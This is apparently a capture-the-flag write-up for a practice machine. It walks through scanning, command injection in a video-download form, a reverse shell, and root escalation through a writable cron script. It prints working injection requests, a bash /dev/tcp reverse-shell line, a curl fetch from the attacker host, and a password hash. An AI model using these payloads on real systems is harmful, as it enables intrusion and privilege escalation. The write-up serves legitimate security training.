# Recon 
`Rustscan` found two ports on the machine 

```console
❯ rustscan -a 10.10.89.4 --ulimit 5000 -- -sC -sV | tee rustscan.log
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/divu050704/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.89.4:22
Open 10.10.89.4:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-07 17:45 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:45
Completed NSE at 17:45, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:45
Completed NSE at 17:45, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:45
Completed NSE at 17:45, 0.00s elapsed
Initiating Ping Scan at 17:45
Scanning 10.10.89.4 [2 ports]
Completed Ping Scan at 17:45, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:45
Completed Parallel DNS resolution of 1 host. at 17:45, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 17:45
Scanning 10.10.89.4 [2 ports]
Discovered open port 80/tcp on 10.10.89.4
Discovered open port 22/tcp on 10.10.89.4
Completed Connect Scan at 17:45, 0.15s elapsed (2 total ports)
Initiating Service scan at 17:45
Scanning 2 services on 10.10.89.4
Completed Service scan at 17:46, 6.36s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.89.4.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:46
Completed NSE at 17:46, 4.83s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:46
Completed NSE at 17:46, 0.58s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:46
Completed NSE at 17:46, 0.00s elapsed
Nmap scan report for 10.10.89.4
Host is up, received syn-ack (0.15s latency).
Scanned at 2022-12-07 17:45:58 IST for 12s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1FkWVdXpiZN4JOheh/PVSTjXUgnhMNTFvHNzlip8x6vsFTwIwtP0+5xlYGjtLorEAS0KpJLtpzFO4p4PvEzMC40SY8E+i4LaiXHcMsJrbhIozUjZssBnbfgYPiwCzMICKygDSfG83zCC/ZiXeJKWfVEvpCVX1g5Al16mzQQnB3qPyz8TmSQ+Kgy7GRc+nnPvPbAdh8meVGcSl9bzGuXoFFEAH5RS8D92JpWDRuTVqCXGxZ4t4WgboFPncvau07A3Kl8BoeE8kDa3DUbPYyn3gwJd55khaJSxkKKlAB/f98zXfQnU0RQbiAlC88jD2TmK8ovd2IGmtqbuenHcNT01D
|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI3zR5EsH+zXjBa4GNOE8Vlf04UROD9GrpAgx0mRcrDQvUdmaF0hYse2KixpRS8Pu1qhWKVRP7nz0LX5nbzb4i4=
|   256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBKsS7+8A3OfoY8qtnKrVrjFss8LQhVeMqXeDnESa6Do
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:46
Completed NSE at 17:46, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:46
Completed NSE at 17:46, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:46
Completed NSE at 17:46, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.71 seconds
```


# What is the name of the secret folder?

**admin**

- Started `gobuster` and found a directories named admin and tmp

```console
❯ gobuster dir --url http://10.10.89.4/   -w /usr/share/wordlists/dirb/common.txt -x php,js,txt,html  | tee gobuster.log    
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.89.4/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,php,js,txt
[+] Timeout:                 10s
===============================================================
2022/12/07 17:37:14 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd.js         (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htaccess.js         (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/.htaccess.html       (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.hta.php             (Status: 403) [Size: 275]
/.hta.js              (Status: 403) [Size: 275]
/.hta.txt             (Status: 403) [Size: 275]
/.hta.html            (Status: 403) [Size: 275]
/.hta                 (Status: 403) [Size: 275]
/admin                (Status: 401) [Size: 457]
/images               (Status: 301) [Size: 309] [--> http://10.10.89.4/images/]
/index.php            (Status: 200) [Size: 747]                                
/index.php            (Status: 200) [Size: 747]                                
/js                   (Status: 301) [Size: 305] [--> http://10.10.89.4/js/]    
/server-status        (Status: 403) [Size: 275]                                
/tmp                  (Status: 301) [Size: 306] [--> http://10.10.89.4/tmp/]   
===============================================================
2022/12/07 17:43:30 Finished
===============================================================
```                              

# What is the user to access the secret folder

**itsmeadmin**

- When we access the web-page it asks for the video id to convert it to mp4
- We can escape native code and do a RCE (Remote Code Execution), by adding `;` as prefix and `;` as suffix.
- Started BurpSuite on the web-page and made a dummy request to capture it.
- Exploited the vulnerability.

![alt](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/35.png)

- Got ping 

```console
❯ sudo tcpdump -i tun0
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
16:48:10.844391 IP 10.17.0.215.52052 > 10.10.149.213.http: Flags [S], seq 1666925888, win 64240, options [mss 1460,sackOK,TS val 1078300085 ecr 0,nop,wscale 7], length 0
16:48:10.989444 IP 10.10.149.213.http > 10.17.0.215.52052: Flags [S.], seq 19980379, ack 1666925889, win 62643, options [mss 1285,sackOK,TS val 2755516371 ecr 1078300085,nop,wscale 6], length 0
16:48:10.995390 IP 10.17.0.215.52052 > 10.10.149.213.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 1078300230 ecr 2755516371], length 0
16:48:10.995635 IP 10.17.0.215.52052 > 10.10.149.213.http: Flags [P.], seq 1:434, ack 1, win 502, options [nop,nop,TS val 1078300236 ecr 2755516371], length 433: HTTP: POST / HTTP/1.1
16:48:11.139631 IP 10.10.149.213.http > 10.17.0.215.52052: Flags [.], ack 434, win 973, options [nop,nop,TS val 2755516521 ecr 1078300236], length 0
16:48:12.096644 IP 10.10.149.213.http > 10.17.0.215.52052: Flags [P.], seq 1:546, ack 434, win 973, options [nop,nop,TS val 2755517476 ecr 1078300236], length 545: HTTP: HTTP/1.1 200 OK
16:48:12.096889 IP 10.17.0.215.52052 > 10.10.149.213.http: Flags [.], ack 546, win 501, options [nop,nop,TS val 1078301337 ecr 2755517476], length 0
16:48:12.097017 IP 10.10.149.213.http > 10.17.0.215.52052: Flags [F.], seq 546, ack 434, win 973, options [nop,nop,TS val 2755517476 ecr 1078300236], length 0
16:48:12.099094 IP 10.17.0.215.52052 > 10.10.149.213.http: Flags [F.], seq 434, ack 547, win 501, options [nop,nop,TS val 1078301340 ecr 2755517476], length 0
16:48:12.243255 IP 10.10.149.213.http > 10.17.0.215.52052: Flags [.], ack 435, win 973, options [nop,nop,TS val 2755517625 ecr 1078301340], length 0
```

- This webpage is using `youtube-dl` this is a library which can be used to convert Youtube links to `mp4`, but we can escape this code by using semi-colons(`;`), this is **shell**.
- Created a shell file with our reverse shell code an uploaded it, with `curl`

```shell
sh -i >& /dev/tcp/10.17.0.215/4444 0>&1
```

```console
POST / HTTP/1.1
Host: 10.10.149.213
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 49
Origin: http://10.10.149.213
Connection: close
Referer: http://10.10.149.213/

yt_url=;curl${IFS}http://10.17.0.215/shell.sh${IFS}-o${IFS}/tmp/shell.sh;
```

- Give it execution rights

```http
POST / HTTP/1.1
Host: 10.10.149.213
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 76
Origin: http://10.10.149.213
Connection: close
Referer: http://10.10.149.213/

yt_url=;chmod${IFS}+x${IFS}/tmp/shell.sh;
```


- Execute the shell

```http
POST / HTTP/1.1
Host: 10.10.149.213
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 44
Origin: http://10.10.149.213
Connection: close
Referer: http://10.10.149.213/

yt_url=;bash${IFS}-i${IFS}/tmp/shell.sh;

```

- Got a shell.

```console
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.17.0.215] from (UNKNOWN) [10.10.149.213] 42098
sh: 0: can't access tty; job control turned off
$
```

- Stabilized the shell and got the user who can access `admin/`

```console
www-data@dmv:/var/www/html$ cd admin/
www-data@dmv:/var/www/html/admin$ ls
flag.txt  index.php
www-data@dmv:/var/www/html/admin$ ls -a
.  ..  .htaccess  .htpasswd  flag.txt  index.php
www-data@dmv:/var/www/html/admin$ cat .htpasswd 
itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
```


# What is the user flag?

**flag{0d8486a0c0c42503bb60ac77f4046ed7}**

```console
www-data@dmv:/var/www/html/admin$ cat flag.txt 
flag{0d8486a0c0c42503bb60ac77f4046ed7}
```

# What is the root flag

**flag{d9b368018e912b541a4eb68399c5e94a}** 

- Tried basic linux privilege escalation methods, but didn't find anything, so loaded `pspy64s` and executed it.

- Found a script `/bin/sh -c cd /var/www/html/tmp && bash /var/www/html/tmp/clean.sh`  running as root on the machine

```console
<-------------------snip--------------------->
2022/12/08 12:05:21 CMD: UID=0    PID=12     | 
2022/12/08 12:05:21 CMD: UID=0    PID=116    | 
2022/12/08 12:05:21 CMD: UID=0    PID=11     | 
2022/12/08 12:05:21 CMD: UID=0    PID=10     | 
2022/12/08 12:05:21 CMD: UID=0    PID=1      | /sbin/init maybe-ubiquity 
2022/12/08 12:06:01 CMD: UID=0    PID=2061   | bash /var/www/html/tmp/clean.sh 
2022/12/08 12:06:01 CMD: UID=0    PID=2060   | /bin/sh -c cd /var/www/html/tmp && bash /var/www/html/tmp/clean.sh 
2022/12/08 12:06:01 CMD: UID=0    PID=2059   | /usr/sbin/CRON -f 
2022/12/08 12:06:01 CMD: UID=0    PID=2062   | 
<------------------snip---------------------->
```

- We have writing rights on the script

```console
www-data@dmv:/var/www/html/tmp$ ls -l clean.sh 
-rw-r--r-- 1 www-data www-data 17 Apr 12  2020 clean.sh
```

- Appended code to copy `root.txt` to `/tmp` and `/var/www/html/` 

```console
www-data@dmv:/var/www/html/tmp$ cat clean.sh 
rm -rf downloads
cp /root/root.txt /tmp
cp /root/root.txt /var/www/html/
```

- Wait for sometime and got flag in the `/` directory of web.

```console
❯ curl http://10.10.149.213/root.txt
flag{d9b368018e912b541a4eb68399c5e94a}
```